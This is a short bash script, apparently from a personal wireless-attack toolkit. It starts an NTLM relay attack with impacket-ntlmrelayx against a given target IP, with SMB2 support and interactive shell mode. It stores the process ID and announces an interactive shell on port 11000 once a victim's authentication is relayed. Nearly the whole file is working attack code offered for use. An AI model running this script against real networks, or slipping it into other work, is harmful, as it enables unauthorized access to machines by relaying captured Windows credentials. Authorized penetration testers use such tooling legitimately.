#!/bin/bash
# Start NTLM relay attack

TARGET="$1"
INTERFACE="${2:-alfa0}"

if [ -z "$TARGET" ]; then
    echo "Usage: ntlmrelay.sh <target_ip> [interface]"
    exit 1
fi

PID_FILE="/tmp/ntlmrelay_pid.txt"
OUTPUT_DIR="/home/ov3rr1d3/wifi_arsenal/captures/evidence/relay"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting NTLM relay to $TARGET"
echo "[*] Waiting for authentication attempts..."

# Create targets file
echo "$TARGET" > /tmp/relay_targets.txt

# Start ntlmrelayx
# -t target
# -smb2support - enable SMB2
# -i - interactive shell mode
impacket-ntlmrelayx -t "$TARGET" -smb2support -i 2>&1 &
RELAY_PID=$!
echo $RELAY_PID > "$PID_FILE"

sleep 2

if ps -p $RELAY_PID > /dev/null 2>&1; then
    echo "[+] NTLM relay started (PID: $RELAY_PID)"
    echo "[+] Relay target: $TARGET"
    echo "[+] When auth is captured, interactive shell on port 11000"
else
    echo "[-] Failed to start relay"
    exit 1
fi
